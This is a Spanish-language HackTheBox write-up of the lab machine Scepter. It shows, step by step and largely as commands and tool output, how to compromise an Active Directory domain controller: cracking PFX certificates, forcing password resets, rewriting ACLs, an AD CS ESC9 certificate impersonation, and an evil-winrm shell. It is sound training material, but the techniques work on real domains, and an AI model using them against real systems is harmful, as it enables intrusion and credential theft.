---
title: Scepter - Hard (HTB)
permalink: /Scepter-HTB-Writeup/
tags:
  - "Windows"
  - "Hard"
  - "NFS Enumeration"
  - "PKCS#12"
  - "pfx2john"
  - "Hash Cracking"
  - "BloodHound"
  - "ACL Rights"
  - "AD CS"
  - "ESC9"
  - "ForceChangePassword"
  - "GenericAll"
  - "PassTheCertificate"
  - "ESC14"
  - "DC Sync"
  - "PassTheHash"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Scepter - Hard (HTB)
seo_description: Aprende a descifrar certificados PFX, abusa de ACL y técnicas de explotación en AD CS para vencer Scepter.
excerpt: Aprende a descifrar certificados PFX, abusa de ACL y técnicas de explotación en AD CS para vencer Scepter.
header:
  overlay_image: /assets/images/headers/scepter-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/scepter-hackthebox.jpg
---

![image-center](/assets/images/posts/scepter-hackthebox.png)
{: .align-center}

**Habilidades:** NFS Enumeration, Cracking PFX File, Abusing AD CS - `ESC9`, Abusing ACLs - `ForceChangePassword` Rights, Abusing ACLs - `GenericAll` Rights, PassTheCertificate, Abusing AD CS - Using `ESC14` B Scenario - Weak Explicit Mapping [Privilege Escalation]
{: .notice--primary}

# Introducción

Scepter es una máquina Windows de dificultad `Hard` en HackTheBox donde debemos vulnerar un entorno de Active Directory. Obtendremos acceso inicial a través de la explotación del servicio AD CS (técnica `ESC9`) una vez hallamos comprometido una cuenta del dominio descifrando un archivo PFX, además de abusar de derechos ACL mal configurados. Escalaremos privilegios mediante la técnica `ESC14` (escenario B) y DC Sync para ganar control total del dominio al volcar los hashes NT de todos los usuarios.  
<br>

# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.65      
PING 10.10.11.65 (10.10.11.65) 56(84) bytes of data.
64 bytes from 10.10.11.65: icmp_seq=1 ttl=127 time=309 ms

--- 10.10.11.65 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 308.620/308.620/308.620/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos con un escaneo de puertos para detectar los servicios expuestos en la máquina víctima. Primeramente nos interesa ver puertos abiertos por el protocolo TCP/IPv4

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.65 -oG openPorts 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-22 11:22 EDT
Nmap scan report for 10.10.11.65
Host is up (0.27s latency).
Not shown: 62180 closed tcp ports (reset), 3325 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49693/tcp open  unknown
49694/tcp open  unknown
49707/tcp open  unknown
49722/tcp open  unknown
49741/tcp open  unknown
49760/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 45.74 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un escaneo más exhaustivo frente a los puertos que hemos descubierto con el fin de detectar la versión y servicio que se ejecuta en cada puerto

~~~ bash
nmap -p 53,88,111,135,139,389,445,464,593,636,2049,3268,3269,5985,5986,9389,47001,49664,49665,49667,49669,49673,49690,49691,49693,49694,49707,49722,49741,49760 -sVC 10.10.11.65 -oN services 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-22 11:23 EDT
Nmap scan report for 10.10.11.65
Host is up (0.25s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-22 23:23:55Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
|_ssl-date: 2025-06-22T23:25:16+00:00; +7h59m58s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
|_ssl-date: 2025-06-22T23:25:15+00:00; +7h59m58s from scanner time.
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scepter.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-22T23:25:16+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
3269/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T03:22:33
|_Not valid after:  2025-11-01T03:22:33
|_ssl-date: 2025-06-22T23:25:15+00:00; +7h59m58s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.scepter.htb
| Subject Alternative Name: DNS:dc01.scepter.htb
| Not valid before: 2024-11-01T00:21:41
|_Not valid after:  2025-11-01T00:41:41
|_http-title: Not Found
|_ssl-date: 2025-06-22T23:25:17+00:00; +7h59m58s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
49741/tcp open  msrpc         Microsoft Windows RPC
49760/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-22T23:25:02
|_  start_date: N/A
|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.02 seconds 
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Veremos muchos servicios, con esta información con certeza podemos decir que estamos frente a un Controlador de Dominio. Se ha identificado el nombre del DC además del dominio (`scepter.htb`). Lo agregaremos en nuestro archivo `/etc/hosts` para poder aplicar la resolución DNS correctamente

~~~ bash
cat /etc/hosts | grep scepter.htb

10.10.11.65 scepter.htb dc01.scepter.htb
~~~


## NFS Enumeration

Dentro de los servicios identificados, encontraremos un servidor NFS ejecutándose en el puerto `2049`, esto lo vemos en la información que muestra el puerto `111` (`rpcbind`).

> NFS (Network File System), es un protocolo que permite a los usuarios **acceder a archivos y directorios ubicados en un servidor remoto** como si estuvieran en su propia máquina local. El puerto predeterminado para NFS es el `2049` tanto para el protocolo TCP como UDP.
{: .notice--info}

Listaremos los recursos compartidos que ofrece este servidor, veremos uno llamado `helpdesk`

~~~ bash
showmount 10.10.11.65 -e                                       
Export list for 10.10.11.65:
/helpdesk (everyone)
~~~

Montaremos el recurso compartido en una carpeta local que crearemos previamente, en mi caso la llamé `nfs`

~~~ bash
mount -t nfs 10.10.11.65:/helpdesk nfs

ls nfs
baker.crt baker.key clark.pfx lewis.pfx scott.pfx
~~~

Veremos unos archivos de certificados además de una clave privada y un certificado digital, ambos llamados `baker`. Analizaremos rápidamente la información del usuario contenida dentro del certificado de clave pública (`.crt`)


## X509 Certificate Dumping

En cuanto al certificado de clave pública (`baker.crt`), podemos llegar a ver el nombre del usuario con el siguiente comando que solo nos muestra el `subject`, quien es el usuario para el que fue emitido el certificado. Veremos el nombre del usuario `d.baker`

~~~ bash
openssl x509 -in baker.crt -subject -noout 
subject=DC = htb, DC = scepter, CN = Users, CN = d.baker, emailAddress = d.baker@scepter.htb
~~~
<br>


# Intrusión / Explotación
---
## Cracking PFX / PKCS#12 File

Con ayuda de la herramienta `pfx2john` extraeremos el hash de un archivo `.pfx` para posteriormente intentar crackearlo. Si la contraseña es vulnerable, podremos ver la información de los certificados

~~~ bash
pfx2john clark.pfx > hash_pfx.txt
~~~

Una vez obtuvimos el hash, procederemos a intentar descifrarlo empleando el diccionario `rockyou.txt`

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash_pfx.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
newpassword      (lewis.pfx)     
1g 0:00:00:00 DONE (2025-04-20 10:26) 2.439g/s 12487p/s 12487c/s 12487C/s newzealand..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~


## PFX / PKCS#12 Certificate Dumping

Se ha encontrado la contraseña `newpassword`, esta debería servir para abrir los archivos `.pfx`

~~~ bash
openssl pkcs12 -in clark.pfx -passin pass:newpassword -nokeys 
Bag Attributes
    localKeyID: E1 84 EA CC 0B 68 19 40 D4 CA 6B 14 C1 8E 9E 30 E7 AA 48 B4 
subject=DC = htb, DC = scepter, CN = Users, CN = m.clark
issuer=DC = htb, DC = scepter, CN = scepter-DC01-CA
-----BEGIN CERTIFICATE-----
MIIGEzCCBPugAwIBAgITYgAAACllRWGwWoYhBQAAAAAAKTANBgkqhkiG9w0BAQsF
ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHc2NlcHRl
cjEYMBYGA1UEAxMPc2NlcHRlci1EQzAxLUNBMB4XDTI0MTEwMjAxMDEzMVoXDTI1
MTEwMjAxMDEzMVowUDETMBEGCgmSJomT8ixkARkWA2h0YjEXMBUGCgmSJomT8ixk
ARkWB3NjZXB0ZXIxDjAMBgNVBAMTBVVzZXJzMRAwDgYDVQQDEwdtLmNsYXJrMIIB
IjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3az3pnSJdCk+TV9/nEtYN/3r
OZ3wLF+xXJohpg/ZKHaL3E7Tp8S71wkHOIgDW/jniRAjvtAkVN0qYQ8WC8tVsL/S
gBm9W5EHzLKGr1KdnkZIZuiLmCnxc3gUnc3wRfOguJO+J9vKWUW4FtcEYON+s++9
uZ1sI3CoM/a2bHKgQYXHwrOiPUUSZz0Ugke27cmKBO2vGE9Ai/9t0xki6ecR35St
iHLRrp74NRm3bCfwLbqMjqoZCh1YBbkzoZcxjMezDUAbgfY0DnfTsxh8AdPwDTyC
+b0KYouRsJDAAgDLonxwylTudADUT5tqCR1pvWEbaYFQ8jiEcmv+HYQ37UaljQID
AQABo4IC7DCCAugwHQYDVR0OBBYEFP1ija3aVjoN3Ix8MY0FUhW22XgDMB8GA1Ud
IwQYMBaAFOuQVDjSpmyJasttTaS6dRVgFSfjMIHKBgNVHR8EgcIwgb8wgbyggbmg
gbaGgbNsZGFwOi8vL0NOPXNjZXB0ZXItREMwMS1DQSxDTj1kYzAxLENOPUNEUCxD
Tj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1
cmF0aW9uLERDPXNjZXB0ZXIsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxp
c3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBwQYIKwYB
BQUHAQEEgbQwgbEwga4GCCsGAQUFBzAChoGhbGRhcDovLy9DTj1zY2VwdGVyLURD
MDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2NlcHRlcixEQz1odGI/Y0FDZXJ0aWZp
Y2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwFwYJ
KwYBBAGCNxQCBAoeCABVAHMAZQByMA4GA1UdDwEB/wQEAwIFoDApBgNVHSUEIjAg
BgorBgEEAYI3CgMEBggrBgEFBQcDBAYIKwYBBQUHAwIwLgYDVR0RBCcwJaAjBgor
BgEEAYI3FAIDoBUME20uY2xhcmtAc2NlcHRlci5odGIwSwYJKwYBBAGCNxkCBD4w
PKA6BgorBgEEAYI3GQIBoCwEKlMtMS01LTIxLTc0ODc5NTQ2LTkxNjgxODQzNC03
NDAyOTUzNjUtMjEwMzBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAO
BggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcwDQYJKoZIhvcNAQEL
BQADggEBAJODRUvbQXLKxtMbiRmsGrSGCDNOJOrltKMg4h1r+6xjasfIvRTb8lJN
wqcq1gxgimXJD2uoerb0Lx3uBXQA7KfCYX+0pU6jaTVzzE09ZPPdf1w0WYfCa3lR
afkDYRe16K9BRgnaIPmQHb+pG3Lp6srHrj+4Dbx0yPkrOVGVwbvZaSaIRSg5YxRq
utQ5bQXyFqVA/+dPmKMHBTsG8yf1KO2u3s9i6uHwLjd5yCoKO20uiyvi2hm5SA4S
yrOzuiF9F1+cQuG+LSLx8EgYxsCV443vnhnHtYqNhvXlpPu0sitM9HVKfLgT5P12
QC50FKklZS/V7stBJkjnh3IfX0w3VfI=
-----END CERTIFICATE-----
~~~

Haremos esto para cada usuario, veremos información como:

- `Subject`: `CN (Common Name)`: A quién está destinado el certificado.
- `Issuer`: `CA -> Certificate Authority`: La entidad que emitió y firmó el certificado

En este caso, todos los certificados contienen el nombre de un usuario del dominio, construiremos una lista con estos nombres

~~~ bash
m.clark
o.scott
e.lewis
~~~


## Exporting a PKCS#12 Certificate

Es posible exportar un certificado `.pfx` desde los archivos `.crt` (certificado de clave pública) y el archivo `.key` (clave privada) que tenemos para el usuario `d.baker`.
<br>
Crearemos un nuevo archivo `.pfx` sin contraseña, si quieres puedes agregar alguna, pero considera que puede dificultarte un poco más la autenticación

~~~ bash
openssl pkcs12 -export -out d.baker.pfx -inkey baker.key -in baker.crt -passin pass:newpassword -passout pass:''
~~~

Usaremos este certificado que acabamos de emitir para conectarnos y poder obtener un TGT (Ticket Granting Ticket) y el hash NT posiblemente usando herramientas como `certipy`

> Primeramente necesitaremos sincronizar nuestro reloj con el Domain Controller, esto debido a que Kerberos usa la marca de tiempo o `timestamp` para emitir tickets
{: .notice--warning}

~~~ bash
ntpdate dc01.scepter.htb && certipy auth -pfx d.baker.pfx -username d.baker -domain scepter.htb -debug

2025-06-11 00:03:23.49999 (-0400) +0.025670 +/- 0.162248 dc01.scepter.htb 10.10.11.65 s1 no-leap
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'scepter.htb' at '192.168.29.2'
[*] Using principal: d.baker@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'd.baker.ccache'
[*] Trying to retrieve NT hash for 'd.baker'
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
~~~

> Si no se sincroniza la hora debido a el error `ntpdig: no eligible servers`, vuelve a intentar o comprueba tu archivo `/etc/hosts` si estás usando el nombre del DC
{: .notice--danger}

Cargaremos el ticket en la variable de entorno `KRB5CCNAME` para usar autenticación `kerberos`

~~~ bash
export KRB5CCNAME=d.baker.ccache
~~~


## Domain Analysis - BloodHound

Como ya tenemos credenciales de un usuario, aunque no tengamos acceso directo con una shell podemos autenticarnos con `kerberos` o con el hash NT. Utilizaremos una de estas formas para recolectar información del dominio y analizarla con `bloodhound`

~~~ bash
bloodhound-python -d scepter.htb -u d.baker --hashes :18b5fb0d99e7a475316213c15b6f22ce -ns 10.10.11.65 --zip -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: scepter.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.scepter.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.scepter.htb
INFO: Found 11 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.scepter.htb
INFO: Done in 01M 12S
INFO: Compressing output into 20250611002921_bloodhound.zip
~~~


## Abusing ACLs - `ForceChangePassword` Rights

El usuario `d.baker` tiene permisos `ForceChangePassword` sobre la cuenta `a.carter`. Como su nombre indica, tenemos la capacidad de cambiar su contraseña

![image-center](/assets/images/posts/scepter-bloodhound.png)
{: .align-center}

No tenemos la contraseña del usuario `d.baker`, así que usaremos su hash NT para cambiar la contraseña usando la herramienta `pth-net` (versión por defecto)

~~~ bash
pth-net rpc password a.carter "newP@assword2022" -U "scepter.htb/d.baker%18b5fb0d99e7a475316213c15b6f22ce" -S dc01.scepter.htb --pw-nt-hash
~~~

- Debemos especificar que estamos usando el hash `NT` para autenticarnos con el parámetro `--pw-nt-hash`. Si estás usando el repositorio de pth-toolkit quita el parámetro del final. 

> Si no puedes avanzar porque ocurre un error, puedes probar esta alternativa con `rpcclient`
{: .notice--danger}

~~~ bash
rpcclient -U 'd.baker%18b5fb0d99e7a475316213c15b6f22ce' 10.10.11.65 --pw-nt-hash -c 'setuserinfo2 a.carter 23 newP@assword2022'
~~~

Como no vemos ningún output, validaremos esta nueva contraseña a través de `smb` con la herramienta `netexec`

~~~ bash
nxc smb 10.10.11.65 -u a.carter -p 'newP@assword2022'
SMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.65     445    DC01             [+] scepter.htb\a.carter:newP@assword2022
~~~


## Abusing ACLs - `GenericAll` Rights over OU

El usuario `a.carter` posee derechos `GenericAll` sobre la unidad organizativa `STAFF ACCESS CERTIFICATE`. Esto permite al usuario `a.carter` disponer de control total sobre la unidad organizativa y sus objetos que están dentro

![image-center](/assets/images/posts/scepter-bloodhound-2.png)
{: .align-center}

Si exploramos esta OU, veremos que el usuario `d.baker` forma parte de ésta

![image-center](/assets/images/posts/scepter-bloodhound-3.png)
{: .align-center}

### Path to `h.brown`

Con la información que hemos recolectado hasta ahora, podemos trazar la siguiente ruta para convertirnos en `h.brown`, quien es el único miembro del grupo `Remote Management Users`, esto significa que: 

- Al convertirnos en `h.brown`, podremos conectarnos a la máquina con `powershell` a través del protocolo `winrm`

![image-center](/assets/images/posts/scepter-bloodhound-4.png)
{: .align-center}

### Granting `FullControl` Rights to `a.carter`

Para comenzar el ataque, necesitamos otorgar el derecho `FullControl` al usuario `a.carter` sobre la unidad organizativa `STAFF ACCESS CERTIFICATE`. Esto le permitirá **controlar a los objetos que sean parte de esta OU**

~~~ bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'a.carter' -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'scepter.htb'/'a.carter':'newP@assword2022'

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250611-010353.bak
[*] DACL modified successfully!
~~~


## Abusing AD CS - `ESC9` Technique

Buscaremos plantillas vulnerables en el servicio AD CS, las cuales `d.baker` pueda utilizar para abusar de configuraciones inseguras

~~~ bash
certipy find -u d.baker -k -vulnerable -stdout -target-ip dc01.scepter.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'scepter-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'scepter-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'scepter-DC01-CA'
...
~~~

Veremos una plantilla que parece ser vulnerable a `ESC9` porque cuenta con la flag `NoSecurityExtension`

~~~ bash
Certificate Templates
  0
    Template Name                       : StaffAccessCertificate
    Display Name                        : StaffAccessCertificate
    Certificate Authorities             : scepter-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireEmail
                                          SubjectRequireDnsAsCn
                                          SubjectAltRequireEmail
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SCEPTER.HTB\staff
      Object Control Permissions
        Owner                           : SCEPTER.HTB\Enterprise Admins
        Full Control Principals         : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Owner Principals          : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Dacl Principals           : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
        Write Property Principals       : SCEPTER.HTB\Domain Admins
                                          SCEPTER.HTB\Local System
                                          SCEPTER.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC9                              : 'SCEPTER.HTB\\staff' can enroll and template has no security extension
~~~

### Understanding Attack

La técnica `ESC9` se aprovecha de las configuraciones inseguras de alguna plantilla de AD CS, concretamente del valor del atributo `msPKI-Enrollment-Flag`, que para esta técnica es necesario que contenga `NoSecurityExtension`. 

Esto nos permite emitir certificados válidos para **suplantar identidades dentro de un dominio**. En el siguiente fragmento podemos ver que `certipy` nos siguiere esta técnica. Podemos ver más detalles en el siguiente [artículo](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension)

~~~ bash
    Certificate Name Flag               : SubjectRequireEmail
                                          SubjectRequireDnsAsCn
                                          SubjectAltRequireEmail
    Enrollment Flag                     : NoSecurityExtension
    [!] Vulnerabilities
      ESC9                              : 'SCEPTER.HTB\\staff' can enroll and template has no security extension
~~~

### (Failed) Exploiting

Para emitir certificados usando esta plantilla, se requiere el atributo `SubjectAltRequireEmail`. Si intentamos impersonar al usuario `h.brown` directamente con `certipy` emitiendo un certificado en su nombre, obtendremos un error

~~~ bash
certipy req -username d.baker -k -ca scepter-DC01-CA -template StaffAccessCertificate -upn h.brown@scepter.htb -target-ip dc01.scepter.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos or SSPI authentication is used. This might fail
[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
~~~

Esto sucede porque no se cumplen los requisitos para obtener un certificado. En este caso, el usuario debe tener asignado el atributo `email`, para poder ser añadido en el atributo `Subject` del certificado

### Forcing `ESC9` - Updating `mail` value

Con los permisos actuales tendremos la capacidad para cambiar el atributo `mail` del usuario `d.baker`

~~~ bash
bloodyAD -d scepter.htb -u a.carter -p 'newP@assword2022' --host dc01.scepter.htb --dc-ip 10.10.11.65 set object d.baker mail -v 'h.brown@scepter.htb' 
[+] d.baker's mail has been updated
~~~

### Issuing a Certificate as `h.brown`

Ahora cumplimos los requerimientos para emitir un certificado impersonando al usuario `h.brown`, lo haremos como el usuario `d.baker`, quien ahora tiene el `mail` de `h.brown` como atributo

~~~ bash
KRB5CCNAME=d.baker.ccache 
certipy req -u d.baker -k -no-pass -ca scepter-DC01-CA -template StaffAccessCertificate -target-ip dc01.scepter.htb -out h.brown    
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos or SSPI authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate without identification
[*] Certificate has no object SID
[*] Saved certificate and private key to 'h.brown.pfx'
~~~


## PassTheCertificate

Con el certificado preparado, podemos usarlo a modo de autenticación, obtendremos credenciales en caché y el hash `NT` del usuario `h.brown`

~~~ bash
certipy auth -pfx h.brown.pfx -username h.brown -domain scepter.htb       
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: h.brown@scepter.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'h.brown.ccache'
[*] Trying to retrieve NT hash for 'h.brown'
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
~~~


## Kerberos Client Setup

Editaremos el archivo `/etc/krb5.conf` para utilizar autenticación `kerberos` en `evil-winrm`. Este archivo es esencial para que nuestro sistema pueda ubicar al KDC (Key Distribution Center) y así solicitar tickets `kerberos`

~~~ bash
cat /etc/krb5.conf         

[libdefaults]
  default_realm = SCEPTER.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  SCEPTER.HTB = {
    kdc = dc01.scepter.htb
    admin_server = dc01.scepter.htb
  }
[domain_realm]
        scepter.htb = SCEPTER.HTB
        .scepter.htb = SCEPTER.HTB
~~~


## Shell as `h.brown`

Ahora podremos conectarnos con `evil-winrm` al dominio como el usuario `h.brown`. Recordemos que debemos cargar las credenciales contenidas en el archivo `.ccache`

~~~ bash
KRB5CCNAME=h.brown.ccache evil-winrm -i dc01.scepter.htb -r scepter.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\h.brown\Documents> whoami
scepter\h.brown
~~~

